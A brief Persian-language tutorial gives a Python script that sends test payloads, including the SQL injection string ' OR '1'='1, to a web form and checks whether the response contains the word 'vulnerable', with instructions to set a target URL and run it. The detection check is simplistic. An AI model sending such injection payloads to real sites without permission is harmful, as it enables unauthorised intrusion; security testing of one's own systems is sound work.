کدهای کامل

import requests def check_vulnerability(url, payload): response = requests.post(url, data={"input": payload}) if "vulnerable" in response.text.lower(): print(f"Vulnerability found with payload: {payload}") else: print("No vulnerability found.") url = "http://example.com" payloads = ["", "' OR '1'='1"] for payload in payloads: check_vulnerability(url, payload)

توضیح کدها

این ابزار با ارسال payloadهای مختلف، امنیت ورودی‌های وب‌سایت را بررسی می‌کند.

آموزش اجرا

URL وب‌سایت هدف را در متغیر 'url' تنظیم کنید و اسکریپت را اجرا کنید.
